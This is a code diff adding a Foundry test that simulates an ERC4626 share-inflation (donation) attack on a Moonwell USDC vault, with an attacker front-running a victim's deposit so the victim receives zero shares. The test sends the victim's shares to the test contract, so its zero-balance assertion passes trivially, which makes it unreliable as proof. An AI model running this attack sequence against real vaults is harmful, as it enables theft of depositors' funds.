@@ -297,4 +297,56 @@ contract CompoundERC4626LiveSystemBaseTest is Test, Compound4626Deploy {
     function test_claimRewards() public {
         vault.claimRewards();
     }
+
+    function testInflationAttack() public {
+        address alice = address(0x1);
+        address bob = address(0x2);
+
+        //set supply cap to unlimited
+        uint256[] memory supplyCaps = new uint256[](1);
+        supplyCaps[0] = 0;
+
+        MToken[] memory mTokens = new MToken[](1);
+        mTokens[0] = MToken(addresses.getAddress("MOONWELL_USDC"));
+
+        vm.startPrank(addresses.getAddress("TEMPORAL_GOVERNOR"));
+        comptroller._setMarketSupplyCaps(mTokens, supplyCaps);
+        vm.stopPrank();
+
+        uint256 mintAmount = 1_000_000e18;
+        uint256 aliceInitialMintAmount = 1;
+        uint256 aliceDonationAmount = 10000e18 - 1;
+        uint256 bobAmount = 19999e18;
+
+        //underlying asset transfers
+        deal(address(underlying), address(this), mintAmount);
+        deal(address(underlying), alice, aliceInitialMintAmount);
+        deal(address(underlying), bob, bobAmount);
+
+        //attacker alice - deposit and donate
+        vm.startPrank(alice);
+
+        underlying.approve(address(vault), aliceInitialMintAmount);
+        vault.deposit(aliceInitialMintAmount, alice);
+        vault.balanceOf(alice);
+        // alice balance - initial deposit - 1
+
+        deal(address(vault.mToken()), alice, aliceDonationAmount);
+        vault.mToken().transfer(address(vault), aliceDonationAmount);
+
+        vm.stopPrank();
+
+        //victim bob - deposit
+        vm.startPrank(bob);
+        underlying.approve(address(vault), bobAmount);
+        vault.deposit(bobAmount, address(this));
+        assertEq(vault.balanceOf(bob), 0);
+        // 0 balance
+        vm.stopPrank();
+
+        //alice redeems
+        vm.startPrank(alice);
+        vault.redeem(aliceInitialMintAmount, alice, alice);
+        vm.stopPrank();
+    }
 }
